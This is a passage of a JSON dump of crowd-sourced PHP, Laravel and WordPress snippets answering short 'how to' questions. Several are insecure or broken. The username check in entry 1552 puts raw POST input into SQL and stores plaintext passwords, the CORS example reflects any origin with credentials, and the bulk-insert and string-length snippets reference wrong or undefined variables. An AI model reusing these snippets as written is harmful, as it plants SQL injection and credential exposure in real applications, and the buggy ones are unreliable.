    "description": "<a href=\"<?php echo wc_get_cart_url() ?>\" class=\"misha-cart\">Cart (<?php echo $woocommerce->cart->cart_contents_count ?>)</a>\nadd_filter( 'woocommerce_add_to_cart_fragments', 'misha_add_to_cart_fragment' );   function misha_add_to_cart_fragment( $fragments ) {   \tglobal $woocommerce;   \t$fragments['.misha-cart'] = '<a href=\"' . wc_get_cart_url() . '\" class=\"misha-cart\">Cart (' . $woocommerce->cart->cart_contents_count . ')</a>';  \treturn $fragments;    }\n",
    "reg_date": "2021-10-12T10:14:38.000Z"
  },
  {
    "id": 1527,
    "keyword": null,
    "link": null,
    "title": " how to alias table name in laravel model",
    "description": "Item     ::from( 'items as items_alias' )     ->join( 'attachments as att', DB::raw( 'att.item_id' ), '=', DB::raw( 'items_alias.id' ) )     ->select( DB::raw( 'items_alias.*' ) )     ->get();\n",
    "reg_date": "2021-10-12T10:14:38.000Z"
  },
  {
    "id": 1528,
    "keyword": null,
    "link": null,
    "title": " how to allow cors through header in php",
    "description": " <?php  header(\"Access-Control-Allow-Origin: *\");\n/**  *  An example CORS-compliant method.  It will allow any GET, POST, or OPTIONS requests from any  *  origin.  *  *  In a production environment, you probably want to be more restrictive, but this gives you  *  the general idea of what is involved.  For the nitty-gritty low-down, read:  *  *  - https://developer.mozilla.org/en/HTTP_access_control  *  - http://www.w3.org/TR/cors/  *  */ function cors() {      // Allow from any origin     if (isset($_SERVER['HTTP_ORIGIN'])) {         // Decide if the origin in $_SERVER['HTTP_ORIGIN'] is one         // you want to allow, and if so:         header(\"Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}\");         header('Access-Control-Allow-Credentials: true');         header('Access-Control-Max-Age: 86400');    // cache for 1 day     }      // Access-Control headers are received during OPTIONS requests     if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {          if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_METHOD']))             // may also be using PUT, PATCH, HEAD etc             header(\"Access-Control-Allow-Methods: GET, POST, OPTIONS\");                   if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']))             header(\"Access-Control-Allow-Headers: {$_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']}\");          exit(0);     }      echo \"You have CORS!\"; }\n",
    "reg_date": "2021-10-12T10:14:38.000Z"
  },
  {
    "id": 1529,
    "keyword": null,
    "link": null,
    "title": " how to assign value of a js variable to a php variable",
    "description": "<script type=\"text/javascript\"> var abc= 'this is text'; <?php $abc = \"<script>document.write(abc)</script>\"?>    </script> <?php echo $abc;?>\n<script> document.cookie = \"myJavascriptVar = \" + myJavascriptVar </script> <?php      $myPhpVar= $_COOKIE['myJavascriptVar']; ?>\n",
    "reg_date": "2021-10-12T10:14:38.000Z"
  },
  {
    "id": 1530,
    "keyword": null,
    "link": null,
    "title": " how to automatically run queue in laravel",
    "description": "for queues with no queue name i.e. queue name = default \tphp artisan queue:work    \t\tor \tphp artisan queue:listen        for jobs with a queue name. Let's assume i have a queue with name = sendemail  \tphp artisan queue:listen --queue=sendemail         note:  queue:work will only work for jobs entries currently in jobs table in database and stop. queue:listen  will go on processing queues continously, both for current and new entries.      \n//laravel //Execute Laravel queues by queue names on coomand line interface->  // I was using running command   'php artisan queue:work'     // which was not running my queued jobs in jobs table.  // Then i relaized, it was only working for jobs with queue column value = 'default' // and  i had given names like sendemail, inboxemail etc.     // So when i changed this other value to  'default'  in queue column in jobs table, // this job ran instantly as i have opended cli and  php artisan queue:work  // command was active.      //So if you want to run only a specific queue by queue name, run command ->      php artisan queue:listen --queue=sendemail  //    or    php artisan queue:listen --queue=inboxemail\n",
    "reg_date": "2021-10-12T10:14:38.000Z"
  },
  {
    "id": 1531,
    "keyword": null,
    "link": null,
    "title": " how to build jquery messages notification with php and mysq",
    "description": "$sql = \"update tbl_noti set status = 'read'\";        $result = $conn->query($sql);        $row = $result->fetch_assoc();        $count = $result->num_rows;        echo $count;        $conn->close(); \n<script>  $(document).ready(function(){  // updating the view with notifications using ajax  function load_unseen_notification(view = '')  {   $.ajax({    url:\"fetch.php\",   method:\"POST\",   data:{view:view},   dataType:\"json\",   success:function(data)    {     $('.dropdown-menu').html(data.notification);     if(data.unseen_notification > 0)    {     $('.count').html(data.unseen_notification);    }    }   });  }  load_unseen_notification();  // submit form and get new records  $('#comment_form').on('submit', function(event){  event.preventDefault();   if($('#subject').val() != '' && $('#comment').val() != '')   {    var form_data = $(this).serialize();    $.ajax({     url:\"insert.php\",    method:\"POST\",    data:form_data,    success:function(data)     {      $('#comment_form')[0].reset();     load_unseen_notification();     }    });   }   else   {   alert(\"Both Fields are Required\");  }  });  // load new notifications  $(document).on('click', '.dropdown-toggle', function(){   $('.count').html('');   load_unseen_notification('yes');  });  setInterval(function(){   load_unseen_notification();;  }, 5000);  });  </script>\n<script type=\"text/javascript\">  $(document).ready(function(){ $(\"#datacount\").load(\"select.php\"); setInterval(function(){ $(\"#datacount\").load('select.php') }, 20000);  });  </script> \n<li class=\"dropdown dropdown-extended dropdown-notification dropdown-dark\" id=\"header_notification_bar\">                                  <a href=\"#\" class=\"dropdown-toggle\" data-toggle=\"dropdown\" data-hover=\"dropdown\" data-close-others=\"true\">                                     <i class=\"icon-bell\"></i>                                     <span class=\"badge badge-success\"><div id=\"datacount\"></div></span> </span>                                 </a>                                 <ul class=\"dropdown-menu\" >                                     <li class=\"external\">                                         <h3>                                             <span class=\"bold\">12 pending</span> notifications</h3>                                         <a href=\"page_user_profile_1.html\">view all</a>                                     </li>                                     <li>                                         <ul class=\"dropdown-menu-list scroller\" style=\"height: 250px;\" data-handle-color=\"#637283\">                                             <li>                                                 <a href=\"javascript:;\">                                                     <span class=\"time\">just now</span>                                                     <span class=\"details\">                                                         <span class=\"label label-sm label-icon label-success\">                                                             <i class=\"fa fa-plus\"></i>                                                         </span> New user registered. </span>                                                 </a>                                             </li>                                          </ul>                                     </li>                                 </ul>                             </li> \n<?php  include('connect.php');  if(isset($_POST['view'])){  // $con = mysqli_connect(\"localhost\", \"root\", \"\", \"notif\");  if($_POST[\"view\"] != '')  {    $update_query = \"UPDATE comments SET comment_status = 1 WHERE comment_status=0\";    mysqli_query($con, $update_query); }  $query = \"SELECT * FROM comments ORDER BY comment_id DESC LIMIT 5\"; $result = mysqli_query($con, $query); $output = '';  if(mysqli_num_rows($result) > 0) {  while($row = mysqli_fetch_array($result))  {    $output .= '   <li>   <a href=\"#\">   <strong>'.$row[\"comment_subject\"].'</strong><br />   <small><em>'.$row[\"comment_text\"].'</em></small>   </a>   </li>    '; } }  else{     $output .= '<li><a href=\"#\" class=\"text-bold text-italic\">No Noti Found</a></li>'; }  $status_query = \"SELECT * FROM comments WHERE comment_status=0\"; $result_query = mysqli_query($con, $status_query); $count = mysqli_num_rows($result_query);  $data = array(    'notification' => $output,    'unseen_notification'  => $count );  echo json_encode($data); } ?>\n",
    "reg_date": "2021-10-12T10:14:38.000Z"
  },
  {
    "id": 1532,
    "keyword": null,
    "link": null,
    "title": " how to bulk insert array into sql ci",
    "description": "$data = array(    array(       'title' => 'My title' ,       'name' => 'My Name' ,       'date' => 'My date'    ),    array(       'title' => 'Another title' ,       'name' => 'Another Name' ,       'date' => 'Another date'    ) );  $this->db->insert_batch('mytable', $data); \n",
    "reg_date": "2021-10-12T10:14:39.000Z"
  },
  {
    "id": 1533,
    "keyword": null,
    "link": null,
    "title": " how to bulk insert array into sql php",
    "description": "$sql = array();  foreach( $data as $row ) {     $sql[] = '(\"'.mysql_real_escape_string($row['text']).'\", '.$row['category_id'].')'; } mysql_query('INSERT INTO table (text, category) VALUES '.implode(',', $sql)); \n$values = array();  foreach($data as $row ) {     $values[] = '('.$row['id'].', \"'.mysql_real_escape_string($row['name']).'\")'; } mysql_query('INSERT INTO table (id, name) VALUES '.implode(',', $sql));\n",
    "reg_date": "2021-10-12T10:14:39.000Z"
  },
  {
    "id": 1534,
    "keyword": null,
    "link": null,
    "title": " how to calculate age in laravel",
    "description": "use Carbon\\Carbon; // Include Class in COntroller  $request->date_of_birth = \"2000-10-25\"; $age = Carbon::parse($request->date_of_birth)->diff(Carbon::now())->y;  dd($age. \" Years\"); // To check result\n",
    "reg_date": "2021-10-12T10:14:39.000Z"
  },
  {
    "id": 1535,
    "keyword": null,
    "link": null,
    "title": " how to calculate date difference between two dates in laravel",
    "description": "$from = date('2018-01-01'); $to = date('2018-05-02');  Reservation::whereBetween('reservation_from', [$from, $to])->get();\n//How to calculate date different between two dates in larevel // METHOD-1 $date1 = new DateTime(\"2018-01-10 00:00:00\"); $date2 = new DateTime(\"2019-05-18 01:23:45\"); $difference = $date1->diff($date2); $diffInSeconds = $difference->s; //45 $diffInMinutes = $difference->i; //23 $diffInHours   = $difference->h; //8 $diffInDays    = $difference->d; //21 $diffInMonths  = $difference->m; //4 $diffInYears   = $difference->y; //1  //or get Date difference as total difference //METHOD-2 $d1 = strtotime(\"2018-01-10 00:00:00\"); $d2 = strtotime(\"2019-05-18 01:23:45\"); $totalSecondsDiff = abs($d1-$d2); //42600225 $totalMinutesDiff = $totalSecondsDiff/60; //710003.75 $totalHoursDiff   = $totalSecondsDiff/60/60;//11833.39 $totalDaysDiff    = $totalSecondsDiff/60/60/24; //493.05 $totalMonthsDiff  = $totalSecondsDiff/60/60/24/30; //16.43 $totalYearsDiff   = $totalSecondsDiff/60/60/24/365; //1.35\n<?php    //check if date between two dates $currentDate = date('Y-m-d'); $currentDate = date('Y-m-d', strtotime($currentDate));    $startDate = date('Y-m-d', strtotime(\"01/09/2019\")); $endDate = date('Y-m-d', strtotime(\"01/10/2019\"));    if (($currentDate >= $startDate) && ($currentDate <= $endDate)){      echo \"Current date is between two dates\"; }else{       echo \"Current date is not between two dates\";   } //@sujay\n",
    "reg_date": "2021-10-12T10:14:39.000Z"
  },
  {
    "id": 1536,
    "keyword": null,
    "link": null,
    "title": " how to calculate days between two dates in php",
    "description": "$startDate = new DateTime(\"2019-10-27\"); $endDate = new DateTime(\"2020-04-11\");  $difference = $endDate->diff($startDate); echo $difference->format(\"%a\");\n<?php function dateDifference($start_date, $end_date) {     // calulating the difference in timestamps      $diff = strtotime($start_date) - strtotime($end_date);           // 1 day = 24 hours      // 24 * 60 * 60 = 86400 seconds     return ceil(abs($diff / 86400)); }   // start date  $start_date = \"2016-01-02\";   // end date  $end_date = \"2016-01-21\";   // call dateDifference() function to find the number of days between two dates $dateDiff = dateDifference($start_date, $end_date);   echo \"Difference between two dates: \" . $dateDiff . \" Days \"; ?> \n",
    "reg_date": "2021-10-12T10:14:39.000Z"
  },
  {
    "id": 1537,
    "keyword": null,
    "link": null,
    "title": " how to calculate days difference between two dates in php",
    "description": "//get Date diff as intervals  $d1 = new DateTime(\"2018-01-10 00:00:00\"); $d2 = new DateTime(\"2019-05-18 01:23:45\"); $interval = $d1->diff($d2); $diffInSeconds = $interval->s; //45 $diffInMinutes = $interval->i; //23 $diffInHours   = $interval->h; //8 $diffInDays    = $interval->d; //21 $diffInMonths  = $interval->m; //4 $diffInYears   = $interval->y; //1  //or get Date difference as total difference $d1 = strtotime(\"2018-01-10 00:00:00\"); $d2 = strtotime(\"2019-05-18 01:23:45\"); $totalSecondsDiff = abs($d1-$d2); //42600225 $totalMinutesDiff = $totalSecondsDiff/60; //710003.75 $totalHoursDiff   = $totalSecondsDiff/60/60;//11833.39 $totalDaysDiff    = $totalSecondsDiff/60/60/24; //493.05 $totalMonthsDiff  = $totalSecondsDiff/60/60/24/30; //16.43 $totalYearsDiff   = $totalSecondsDiff/60/60/24/365; //1.35\n$date1 = \"2007-03-24\"; $date2 = \"2009-06-26\";  $diff = abs(strtotime($date2) - strtotime($date1));  $years = floor($diff / (365*60*60*24)); $months = floor(($diff - $years * 365*60*60*24) / (30*60*60*24)); $days = floor(($diff - $years * 365*60*60*24 - $months*30*60*60*24)/ (60*60*24));  printf(\"%d years, %d months, %d days\\n\", $years, $months, $days);\n// how to calculate days difference between two dates in laravel  use DateTime; // inside Controller Class  $startDate = new DateTime($request->start_date); $endDate   = new DateTime($request->end_date);  $daysDifference = ($startDate->diff($endDate)->days);\nphpCopy$firstDate = \"2019-01-01\"; $secondDate = \"2020-03-04\";  $dateDifference = abs(strtotime($secondDate) - strtotime($firstDate));  $years  = floor($dateDifference / (365 * 60 * 60 * 24)); $months = floor(($dateDifference - $years * 365 * 60 * 60 * 24) / (30 * 60 * 60 * 24)); $days   = floor(($dateDifference - $years * 365 * 60 * 60 * 24 - $months * 30 * 60 * 60 *24) / (60 * 60 * 24));  echo $years.\" year,  \".$months.\" months and \".$days.\" days\";  //output: 1 year, 2 months and 3 days \nfunction numWeeks($dateOne, $dateTwo){     //Create a DateTime object for the first date.     $firstDate = new DateTime($dateOne);     //Create a DateTime object for the second date.     $secondDate = new DateTime($dateTwo);     //Get the difference between the two dates in days.     $differenceInDays = $firstDate->diff($secondDate)->days;     //Divide the days by 7     $differenceInWeeks = $differenceInDays / 7;     //Round down with floor and return the difference in weeks.     return floor($differenceInWeeks); }  $numOfWeek = numWeeks('2021-01-21', '2021-01-28');\n",
    "reg_date": "2021-10-12T10:14:39.000Z"
  },
  {
    "id": 1538,
    "keyword": null,
    "link": null,
    "title": " how to call api using curl method",
    "description": "// create & initialize a curl session $curl = curl_init();  // set our url with curl_setopt() curl_setopt($curl, CURLOPT_URL, \"api.example.com\");  // return the transfer as a string, also with setopt() curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);  // curl_exec() executes the started curl session // $output contains the output string $output = curl_exec($curl);  // close curl resource to free up system resources // (deletes the variable made by curl_init) curl_close($curl);\n",
    "reg_date": "2021-10-12T10:14:39.000Z"
  },
  {
    "id": 1539,
    "keyword": null,
    "link": null,
    "title": " how to catch mysql error in php",
    "description": "<?php define(\"MYSQL_CONN_ERROR\", \"Unable to connect to database.\");  // Ensure reporting is setup correctly mysqli_report(MYSQLI_REPORT_STRICT);  // Connect function for database access function connect($usr,$pw,$db,$host) {    try {       $mysqli = new mysqli($host,$usr,$pw,$db);       $connected = true;    } catch (mysqli_sql_exception $e) {       throw $e;    } }  try {   connect('username','password','database','host');   echo 'Connected to database'; } catch (Exception $e) {   echo $e->errorMessage(); } ?>\n",
    "reg_date": "2021-10-12T10:14:40.000Z"
  },
  {
    "id": 1540,
    "keyword": null,
    "link": null,
    "title": " how to catch query exception in laravel 8",
    "description": "try {    $results = \\DB::connection(\"example\")     ->select(\\DB::raw(\"SELECT * FROM unknown_table\"))     ->first();      // Closures include ->first(), ->get(), ->pluck(), etc. } catch(\\Illuminate\\Database\\QueryException $ex){    dd($ex->getMessage());    // Note any method of class PDOException can be called on $ex. } \n",
    "reg_date": "2021-10-12T10:14:40.000Z"
  },
  {
    "id": 1541,
    "keyword": null,
    "link": null,
    "title": " how to change existing migration laravel",
    "description": "php artisan make:migration add_paid_to_users_table --table=users \nphp artisan make:migration update_user_guide_in_product_translations_table\nphp artisan make:migration update_description_in_products_table\n",
    "reg_date": "2021-10-12T10:14:40.000Z"
  },
  {
    "id": 1542,
    "keyword": null,
    "link": null,
    "title": " how to change laravel 8 login credentials",
    "description": "//add below code to fortify service provider boot function Fortify::authenticateUsing(function (LoginRequest $request) { \t\t    $user = User::where('user_name', $request->user_name);  \t\t    if ( \t\t\t    $user && \t\t\t    Hash::check($request->password, $user->password) \t\t    ) { \t\t\t    return $user; \t\t    } \t    }); //and change username in fortify config  'username' => 'user_name',\n",
    "reg_date": "2021-10-12T10:14:40.000Z"
  },
  {
    "id": 1543,
    "keyword": null,
    "link": null,
    "title": " how to change laravel port",
    "description": "php artisan serve --host=sample.dev --port=8080 \n",
    "reg_date": "2021-10-12T10:14:40.000Z"
  },
  {
    "id": 1544,
    "keyword": null,
    "link": null,
    "title": " how to change the default timezone setting in laravel",
    "description": "edit /config/app.php 'timezone' => 'Asia/Dhaka' \nIn Laravel Application, You can set your Application Time Zone by configuring app.php file in config folder. To change time zone , modify the value of timezone in config/app.php file.  by default &lsquo;timezone&rsquo; => &lsquo;UTC&rsquo;,  /*    |--------------------------------------------------------------------------    | Application Timezone    |--------------------------------------------------------------------------    |    | Here you may specify the default timezone for your application, which    | will be used by the PHP date and date-time functions. We have gone    | ahead and set this to a sensible default for you out of the box.    |    */    'timezone' => 'UTC', For Ex : i set my application time zone is &lsquo;Asia/Kolkata&rsquo;  'timezone' => 'Asia/Kolkata', List of available timezones can be find in following URL http://php.net/manual/en/timezones.php\n",
    "reg_date": "2021-10-12T10:14:40.000Z"
  },
  {
    "id": 1545,
    "keyword": null,
    "link": null,
    "title": " how to check if PHP variable contains non-numbers?",
    "description": "if ( is_numeric($_POST['foo']) ) {     $foo = $_POST['foo']; } else {     // Error }\n",
    "reg_date": "2021-10-12T10:14:40.000Z"
  },
  {
    "id": 1546,
    "keyword": null,
    "link": null,
    "title": " how to check if a string contains a substring in php",
    "description": "$myString = 'Hello Bob how are you?';  if (strpos($myString, 'Bob') !== false) {      echo \"My string contains Bob\";  }\n$a = 'How are you?';  if (strpos($a, 'are') !== false) {     echo 'true'; } \nif (strpos($haystack,$needle) !== false) {     echo \"$haystack contains $needle\"; }\nstr_contains('STRING', 'SUB_STRING');\n",
    "reg_date": "2021-10-12T10:14:40.000Z"
  },
  {
    "id": 1547,
    "keyword": null,
    "link": null,
    "title": " how to check if a url is down php",
    "description": "<?php $url = 'http://google.com';  if(@file_get_contents($url)){ \t \techo \"Website is up\"; \t } else { \t \techo \"Website is down\"; \t }  ?>\n",
    "reg_date": "2021-10-12T10:14:40.000Z"
  },
  {
    "id": 1548,
    "keyword": null,
    "link": null,
    "title": " how to check if a url is up php",
    "description": "<?php $url = 'http://google.com';  if(@file_get_contents($url)){ \t \techo \"Website is up\"; \t } else { \t \techo \"Website is down\"; \t }  ?>\n",
    "reg_date": "2021-10-12T10:14:41.000Z"
  },
  {
    "id": 1549,
    "keyword": null,
    "link": null,
    "title": " how to check if key is present in json in php",
    "description": "if( isset( $mydata['user_id'] ) ){    // do something }\n",
    "reg_date": "2021-10-12T10:14:41.000Z"
  },
  {
    "id": 1550,
    "keyword": null,
    "link": null,
    "title": " how to check if there is an authenticated user laravel",
    "description": "if (Auth::check()) { // The user is logged in... }\n",
    "reg_date": "2021-10-12T10:14:41.000Z"
  },
  {
    "id": 1551,
    "keyword": null,
    "link": null,
    "title": " how to check if user is logged in wordpress",
    "description": "if ( is_user_logged_in() ) {    // your code for logged in user  } else {    // your code for logged out user  }\n<?php  if ( is_user_logged_in() ) {   echo 'Welcome, logged in user. <a href=\"'.wp_logout_url().'\">Click here to logout</a>.'; }else{   echo 'Please login by <a href=\"'.wp_login_url().'\">clicking here</a>.' }\n<?php add_action('admin_init', 'wpse74389_check_username'); function wpse74389_check_username() {     $user = wp_get_current_user();      if($user && isset($user->user_login) && 'username_to_check' == $user->user_login) {         // do stuff     } } \n",
    "reg_date": "2021-10-12T10:14:41.000Z"
  },
  {
    "id": 1552,
    "keyword": null,
    "link": null,
    "title": " how to check if username already exists in php",
    "description": "$firstname = $_POST[\"firstname\"]; $lastname = $_POST[\"lastname\"]; $email = $_POST[\"email\"]; $pass = $_POST[\"password\"];  $check_email = mysqli_query($conn, \"SELECT Email FROM crud where Email = '$email' \"); if(mysqli_num_rows($check_email) > 0){     echo('Email Already exists'); } else{     if ($_SERVER[\"REQUEST_METHOD\"] == \"POST\") {     $result = mysqli_query($conn, \"INSERT INTO crud (Firstname, Lastname, Email, Password) VALUES ('$firstname', '$lastname', '$email', '$pass')\"); }     echo('Record Entered Successfully'); } \n$sql = \"SELECT username FROM table_name WHERE username='{$username}'\"; $result = mysqli_query($con,$sql) or die(\"Query unsuccessful\") ;       if (mysqli_num_rows($result) > 0) {         echo \"Username is already exist\";       } else {              ...............          }\n",
    "reg_date": "2021-10-12T10:14:41.000Z"
  },
  {
    "id": 1553,
    "keyword": null,
    "link": null,
    "title": " how to check laravel version",
    "description": "php artisan --version\nphp artisan --version   or php artisan -v\n$php artisan --version\nphp artisan --version  //enter in terminal\nphp ./artisan --version ##or php artisan --version\n",
    "reg_date": "2021-10-12T10:14:41.000Z"
  },
  {
    "id": 1554,
    "keyword": null,
    "link": null,
    "title": " how to check laravel version in cmd",
    "description": "php artisan --version\n$php artisan --version\n",
    "reg_date": "2021-10-12T10:14:41.000Z"
  },
  {
    "id": 1555,
    "keyword": null,
    "link": null,
    "title": " how to check php string length",
    "description": " <?php $str = 'abcdef'; echo strlen($str); // 6  $str = ' ab cd '; echo strlen($str); // 7 ?>  \n<?php $name = 'abcdef'; echo strlen($str); // 6  $string = ' ab cd '; echo strlen($str); // 7 ?>\n/* To measure the length of string there is built-in function in php which returns the exact length of string. */  Syntax: strlen(paramenter);  <?php $name = 'ankur'; echo \"Name Length : \".strlen($name);  // Name Length : 5  $message = 'Welcome greppers !'; echo \"Message Length : \".strlen($message);  // Message Length : 18 ?>    /* I hope it will help you. Namaste */\nphpCopy<?php $mystring = \"This is my string\"; echo(\"The string length in bytes is: \"); echo(mb_strlen($mystring)); ?> \n",
    "reg_date": "2021-10-12T10:14:41.000Z"
  },
  {
    "id": 1556,
    "keyword": null,
    "link": null,
    "title": " how to check php version in php",
    "description": "echo PHP_VERSION;\n<?php echo 'PHP version: ' . phpversion(); ?>\n/* in terminal type it*/ php -v\n<?php   echo 'PHP version:' . phpinfo(); ?>  \n",
    "reg_date": "2021-10-12T10:14:41.000Z"
  },
  {
    "id": 1557,
    "keyword": null,
    "link": null,
    "title": " how to check query execution time in laravel",
    "description": "//place this before any script you want to calculate time $time_start = microtime(true);   //sample script for($i=0; $i<1000; $i++){  //do anything }  $time_end = microtime(true); $execution_time = ($time_end - $time_start); echo '<b>Total Execution Time:</b> '.($execution_time*1000).'Milliseconds'; \n",
    "reg_date": "2021-10-12T10:14:42.000Z"
  },
  {
    "id": 1558,
    "keyword": null,
    "link": null,
    "title": " how to check query execution time in php",
    "description": "//place this before any script you want to calculate time $time_start = microtime(true);   //sample script for($i=0; $i<1000; $i++){  //do anything }  $time_end = microtime(true); $execution_time = ($time_end - $time_start); echo '<b>Total Execution Time:</b> '.($execution_time*1000).'Milliseconds'; \n",
    "reg_date": "2021-10-12T10:14:42.000Z"
  },
  {
    "id": 1559,
    "keyword": null,
    "link": null,
    "title": " how to check the day of any date in php",
    "description": "$timestamp = strtotime('2009-10-22');  $day = date('D', $timestamp); var_dump($day);\n// how to check the day of any date in php?  //Our YYYY-MM-DD date string. $date = $request->start_date;  //Convert the date string into a unix timestamp. $unixTimestamp = strtotime($date);  //Get the day of the week using PHP's date function. $dayOfWeek = date(\"l\", $unixTimestamp);  //Print out the day that our date fell on. $day = $date . ' fell on a ' . $dayOfWeek;\n// function cal_days_in_month(calendar,month,year); //e.g. $d=cal_days_in_month(CAL_GREGORIAN,10,2005); echo \"There was $d days in October 2005\";\n",
    "reg_date": "2021-10-12T10:14:42.000Z"
  },
  {
    "id": 1560,
    "keyword": null,
    "link": null,
    "title": " how to check the size of mysql database in phpmyadmin",
    "description": "SELECT table_schema \"Data Base Name\", sum( data_length + index_length ) / 1024 / 1024 \"Data Base Size in MB\" FROM information_schema.TABLES GROUP BY table_schema ;\n",
    "reg_date": "2021-10-12T10:14:42.000Z"
  },
  {
    "id": 1561,
    "keyword": null,
    "link": null,
    "title": " how to check time overlap",
    "description": "public function check_time_overlap($start_time1, $end_time1, $start_time2, $end_time2) { \treturn (($start_time1) <=  ($end_time2) && ($start_time2) < ($end_time1) ? true : false); }  // true: overlap // falseL not overlap\nif((StartDate1 <= EndDate2) && (StartDate2 <= EndDate1)) {   \t//overlapping dates }\n",
    "reg_date": "2021-10-12T10:14:42.000Z"
  },
  {
    "id": 1562,
    "keyword": null,
    "link": null,
    "title": " how to check website 404 status in php",
    "description": "<?php $url = 'http://google.com';  if(@file_get_contents($url)){ \t \techo \"Website is up\"; \t } else { \t \techo \"Website is down\"; \t }  ?>\nErrorDocument 404 /404page.html\n",
    "reg_date": "2021-10-12T10:14:42.000Z"
  },
  {
    "id": 1563,
    "keyword": null,
    "link": null,
    "title": " how to cheeck php",
    "description": "echo PHP_VERSION;\n<?phpphpinfo(); ?>\n",
    "reg_date": "2021-10-12T10:14:42.000Z"
  },
  {
    "id": 1564,
    "keyword": null,
    "link": null,
    "title": " how to clear session in laravel",
    "description": "# ref: https://laravel.io/forum/02-06-2014-session-destroy  Session::forget('yourKeyGoesHere') // Removes a specific variable \n# ref: https://laravel.io/forum/02-06-2014-session-destroy  Session::forget('yourKeyGoesHere') // Removes a specific variable\n",
    "reg_date": "2021-10-12T10:14:42.000Z"
  },
  {
    "id": 1565,
    "keyword": null,
    "link": null,
    "title": " how to close mysql connection",
    "description": "// Creating connection $conn = mysqli_connect(\"localhost\", \"username\", \"password\"); // closing connection mysqli_close($conn);\n",
    "reg_date": "2021-10-12T10:14:42.000Z"
  },
  {
    "id": 1566,
    "keyword": null,
    "link": null,
    "title": " how to collapse or expand functions in laravel vscode",
    "description": "Fold All: CTRL+K, CTRL+0 (zero)  Fold Level [n]: CTRL+K, CTRL+[n]*  Unfold All: CTRL+K, CTRL+J  Fold Region: CTRL+K, CTRL+[  Unfold Region: CTRL+K, CTRL+]\n",
    "reg_date": "2021-10-12T10:14:42.000Z"
  },
  {
    "id": 1567,
    "keyword": null,
    "link": null,
    "title": " how to combine variables and text into a string php",
    "description": "<?php $number = 8; $txt = \"the number is\".$number.\", ok?\"; //Use a dot to combine echo $txt; ?>\n$a = \"hello\"; $b = \"world\"; $c = $a . \" \" . $b;  echo $c; // hello world\n$a = \"Hello \"; $a .= \"World!\";   \nRemember dot .\n<?php   $name = \"Paul\";\t   $age = 26;    echo \"My name is {$name}, I'm {$age} years old \";\npublic function getAvg(string $var) {   # A sample from a game I wrote.   # Concatenatin on the other side is just {stuff.$var}   # You can also concatenate multiple variables in a varaible:   # {$varA.$varb}   $min = $this->{$var._min};   # Assigns to $min object property matching $var + '_min' string.   $max = $this->{$var._max};   # Assigns to $max object property matching $var + '_max' string.   $avg = (($min + $max) / 2);   return round($avg); }\n",
    "reg_date": "2021-10-12T10:14:43.000Z"
  },
  {
    "id": 1568,
    "keyword": null,
    "link": null,
    "title": " how to concat in where clause like laravel query builder",
    "description": "$query = DB::table('mbo_party')->where(DB::raw(\"CONCAT(first,' ',last)\"), 'LIKE', '%' . $party_name . '%')->first(); \n$query->orWhere(DB::raw(\"CONCAT(`nvp`, ' ', `vpv`)\"), 'LIKE', \"%\".$this->searchNeedle.\"%\"); \n",
    "reg_date": "2021-10-12T10:14:43.000Z"
  },
  {
    "id": 1569,
    "keyword": null,
    "link": null,
    "title": " how to connect pdo php database",
    "description": "<?php $servername = \"localhost\"; $username = \"username\"; $password = \"password\";  try {     $conn = new PDO(\"mysql:host=$servername;dbname=myDB\", $username, $password);     // set the PDO error mode to exception     $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);     echo \"Connected successfully\";     } catch(PDOException $e)     {     echo \"Connection failed: \" . $e->getMessage();     } ?>\n$host     = \"localhost\";//Ip of database, in this case my host machine     $user     = \"root\";\t//Username to use $pass     = \"qwerty\";//Password for that user $dbname   = \"DB\";//Name of the database  try {     $connection = new PDO(\"mysql:host=$host;dbname=$dbname\", $user, $pass);     $connection->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);  }catch(PDOException $e) {   echo $e->getMessage();                          }\n<?php $servername = \"localhost\"; $username = \"username\"; $password = \"password\";  try {   $conn = new PDO(\"mysql:host=$servername;dbname=myDB\", $username, $password);   // set the PDO error mode to exception   $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);   echo \"Connected successfully\"; } catch(PDOException $e) {   echo \"Connection failed: \" . $e->getMessage(); } ?>\n$connect = new PDO(\"mysql:host=$host;dbname=$db\", $user, $pass, array(PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION)); \n",
    "reg_date": "2021-10-12T10:14:43.000Z"
  },
  {
    "id": 1570,
    "keyword": null,
    "link": null,
    "title": " how to connect to a database in php",
    "description": "$servername = \"localhost\"; $username = \"username\"; $password = \"password\";  // Create connection $conn = new mysqli($servername, $username, $password);  // Check connection if ($conn->connect_error) {     die(\"Connection failed: \" . $conn->connect_error); } echo \"Connected successfully\";   Simplified  $conn = mysqli_connect('localhost', 'username', 'password'); $database = mysqli_select_db($conn, 'database');\n<?php $servername = \"localhost\"; $username = \"username\"; $password = \"password\";  // Create connection $conn = new mysqli($servername, $username, $password);  // Check connection if ($conn->connect_error) {     die(\"Connection failed: \" . $conn->connect_error); } echo \"Connected successfully\"; ?>\n",
    "reg_date": "2021-10-12T10:14:43.000Z"
  },
  {
    "id": 1571,
    "keyword": null,
    "link": null,
    "title": " how to convert array to string with commas in php",
    "description": "$arr = array ( 0 => \"lorem\", 1 => \"ipsum\", 2 => \"dolor\");  $str = implode (\", \", $arr);\n$string = implode(', ', $tags);\n $tags = implode(', ', array('tag1','tag2','tag3','tag4'));\n",
    "reg_date": "2021-10-12T10:14:43.000Z"
  },
  {
    "id": 1572,
    "keyword": null,
    "link": null,
    "title": " how to convert string word to lowercase in php",
    "description": "strtolower ( string $string ) : string  //Returns string with all alphabetic characters converted to lowercase. $string = 'HELLO WORLD'; echo strtolower($string); //Output: 'hello world'\nThe strtolower() function is used to convert a string into lowercase. This function takes a string as parameter and converts all the uppercase english alphabets present in the string to lowercase.\nstrtolower ( string $string ) : string  //Returns string with all alphabetic characters converted to lowercase. $string = 'HELLO WORLD'; echo strtolower($string); //Output: 'hello world' The strtolower() function is used to convert a string into lowercase. This function takes a string as parameter and converts all the uppercase english alphabets present in the string to lowercase.\n",
    "reg_date": "2021-10-12T10:14:43.000Z"
  },
  {
